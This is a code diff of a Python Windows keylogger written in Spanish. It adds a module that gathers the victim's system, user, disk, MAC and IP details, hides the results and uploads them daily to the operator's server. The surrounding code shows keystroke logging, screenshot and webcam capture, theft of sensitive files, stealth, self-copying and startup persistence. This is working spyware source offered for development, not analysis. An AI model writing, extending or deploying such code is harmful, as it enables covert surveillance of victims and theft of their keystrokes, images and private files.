@@ -16,8 +16,13 @@ import hashlib
 import socket
 import win32gui
 import cv2
+import platform
+import psutil
+import subprocess
+import uuid
+import re
 
-TEST_MODE = False
+TEST_MODE = True
 ENABLE_STEALTH = False
 ENABLE_STARTUP = False
 ENABLE_SELF_COPY = False
@@ -30,6 +35,7 @@ UPLOAD_INTERVAL = 300
 FILE_EXTRACTION_INTERVAL = 86400
 CAMERA_CAPTURE_INTERVAL = 10
 CAMERA_UPLOAD_INTERVAL = 120
+SYSTEM_INFO_INTERVAL = 86400
 MAX_RETRIES = 3
 RETRY_DELAY = 30
 
@@ -59,6 +65,7 @@ SCREENSHOT_DIR = os.path.join(BASE_PATH, 'screenshots')
 LOG_DIR = os.path.join(BASE_PATH, 'logs')
 EXTRACTED_FILES_DIR = os.path.join(BASE_PATH, 'extracted_files')
 CAMERA_DIR = os.path.join(BASE_PATH, 'camera')
+SYSTEM_INFO_DIR = os.path.join(BASE_PATH, 'system_info')
 DEBUG_LOG = os.path.join(BASE_PATH, 'debug.log')
 CRASH_LOG = os.path.join(BASE_PATH, 'crash.log')
 
@@ -147,7 +154,7 @@ def hide_window():
 
 def setup_directories():
     try:
-        directories = [BASE_PATH, SCREENSHOT_DIR, LOG_DIR, EXTRACTED_FILES_DIR, CAMERA_DIR]
+        directories = [BASE_PATH, SCREENSHOT_DIR, LOG_DIR, EXTRACTED_FILES_DIR, CAMERA_DIR, SYSTEM_INFO_DIR]
         for directory in directories:
             os.makedirs(directory, exist_ok=True)
             hide_file(directory)
@@ -157,6 +164,94 @@ def setup_directories():
             print(f"Error creando directorios: {str(e)}")
         return False
 
+def get_system_info():
+    try:
+        info = {}
+
+        info['Sistema Operativo'] = f"{platform.system()} {platform.release()} {platform.version()}"
+        info['Arquitectura'] = platform.machine()
+        info['Procesador'] = platform.processor()
+        info['Hostname'] = socket.gethostname()
+        info['Usuario'] = os.getenv('USERNAME')
+
+        info['Memoria RAM Total'] = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
+        info['Memoria RAM Disponible'] = f"{round(psutil.virtual_memory().available / (1024**3), 2)} GB"
+
+        disks = []
+        for partition in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(partition.mountpoint)
+                disks.append({
+                    'Dispositivo': partition.device,
+                    'Punto de Montaje': partition.mountpoint,
+                    'Sistema de Archivos': partition.fstype,
+                    'Espacio Total': f"{round(usage.total / (1024**3), 2)} GB",
+                    'Espacio Usado': f"{round(usage.used / (1024**3), 2)} GB",
+                    'Espacio Libre': f"{round(usage.free / (1024**3), 2)} GB"
+                })
+            except:
+                continue
+        info['Discos'] = disks
+        
+        # Información de red
+        info['Dirección MAC'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        info['Direcciones IP'] = []
+        for interface, addrs in psutil.net_if_addrs().items():
+            for addr in addrs:
+                if addr.family == socket.AF_INET:
+                    info['Direcciones IP'].append(f"{interface}: {addr.address}")
+        
+        try:
+            result = subprocess.run(['wmic', 'path', 'win32_VideoController', 'get', 'name'], 
+                                  capture_output=True, text=True, timeout=10)
+            gpus = [line.strip() for line in result.stdout.split('\n') if line.strip() and 'Name' not in line]
+            info['GPUs'] = gpus
+        except:
+            info['GPUs'] = ["No se pudo obtener información de GPU"]
+        
+        return info
+    except Exception as e:
+        if TEST_MODE:
+            print(f"Error obteniendo información del sistema: {str(e)}")
+        return {"Error": f"No se pudo obtener información del sistema: {str(e)}"}
+
+def save_system_info():
+    try:
+        system_info = get_system_info()
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"system_info_{timestamp}.txt"
+        file_path = os.path.join(SYSTEM_INFO_DIR, filename)
+        
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write("=== INFORMACIÓN DEL SISTEMA ===\n\n")
+            f.write(f"Fecha y Hora: {datetime.now()}\n\n")
+            for key, value in system_info.items():
+                if key == 'Discos':
+                    f.write(f"\n--- DISCOS ---\n")
+                    for disk in value:
+                        for disk_key, disk_value in disk.items():
+                            f.write(f"{disk_key}: {disk_value}\n")
+                        f.write("\n")
+                elif key == 'Direcciones IP':
+                    f.write(f"\n--- DIRECCIONES IP ---\n")
+                    for ip in value:
+                        f.write(f"{ip}\n")
+                elif key == 'GPUs':
+                    f.write(f"\n--- GPUs ---\n")
+                    for gpu in value:
+                        f.write(f"{gpu}\n")
+                else:
+                    f.write(f"{key}: {value}\n")
+        
+        hide_file(file_path)
+        if TEST_MODE:
+            print(f"Información del sistema guardada: {file_path}")
+        return file_path
+    except Exception as e:
+        if TEST_MODE:
+            print(f"Error guardando información del sistema: {str(e)}")
+        return None
+    
 def update_modifier_state(key, is_press):
     global shift_pressed, caps_lock_on, num_lock_on
     try:
@@ -420,6 +515,13 @@ def upload_extracted_files():
         lambda f: any(f.lower().endswith(ext) for ext in SENSITIVE_EXTENSIONS)
     )
 
+def upload_system_info():
+    return upload_files(
+        SYSTEM_INFO_DIR,
+        "upload/system_info",
+        lambda f: f.startswith("system_info_") and f.endswith(".txt")
+    )
+
 def capture_camera_image():
     if not ENABLE_CAMERA_CAPTURE:
         return None
@@ -477,7 +579,7 @@ def upload_camera_images():
         if TEST_MODE:
             print(f"Error enviando fotos: {str(e)}")
         return False
-
+    
 def scheduled_camera_capture():
     if is_running and ENABLE_CAMERA_CAPTURE:
         try:
@@ -559,6 +661,18 @@ def scheduled_file_extraction():
         finally:
             Timer(FILE_EXTRACTION_INTERVAL, scheduled_file_extraction).start()
 
+def scheduled_system_info_collection():
+    if is_running and not TEST_MODE:
+        try:
+            save_system_info()
+            if check_internet_connection():
+                upload_system_info()
+        except Exception as e:
+            if TEST_MODE:
+                print(f"Error en recolección programada de información del sistema: {str(e)}")
+        finally:
+            Timer(SYSTEM_INFO_INTERVAL, scheduled_system_info_collection).start()
+
 def main():
     global current_log_file, is_running, ENABLE_STEALTH, last_window
     if not TEST_MODE:
@@ -587,18 +701,26 @@ def main():
         print(f"ScreenShots: {SCREENSHOT_DIR}")
         print(f"Logs: {LOG_DIR}")
         print(f"Extracted Files: {EXTRACTED_FILES_DIR}")
+        print(f"System Info: {SYSTEM_INFO_DIR}")
         print(f"Camera: {CAMERA_DIR}")
         print(f"Servidor: {SERVER_BASE_URL}")
         print(f"Capturas cada: {SCREENSHOT_INTERVAL}s, Envíos cada: {UPLOAD_INTERVAL}s")
         print(f"Extracción de archivos cada: {FILE_EXTRACTION_INTERVAL}s")
         print(f"Capturas de cámara cada: {CAMERA_CAPTURE_INTERVAL}s")
         print(f"Envíos de cámara cada: {CAMERA_UPLOAD_INTERVAL}s")
+        print(f"Información del sistema cada: {SYSTEM_INFO_INTERVAL}s")
         if copy_success:
             print(f"Auto-copia creada: {copy_path}")
         print("=============================")
     if copy_path and ENABLE_STARTUP and add_to_startup(copy_path):
         if TEST_MODE:
             print(f"Persistencia añadida al inicio usando: {copy_path}")
+
+    if not TEST_MODE:
+        save_system_info()
+        if check_internet_connection():
+            upload_system_info()
+    
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     current_log_file = os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
     with open(current_log_file, 'w', encoding='utf-8') as f:
@@ -621,6 +743,10 @@ def main():
     if ENABLE_CAMERA_CAPTURE:
         scheduled_camera_capture()
         scheduled_camera_upload()
+    
+    if not TEST_MODE:
+        scheduled_system_info_collection()
+    
     if TEST_MODE:
         print("Keylogger iniciado correctamente")
     while is_running:
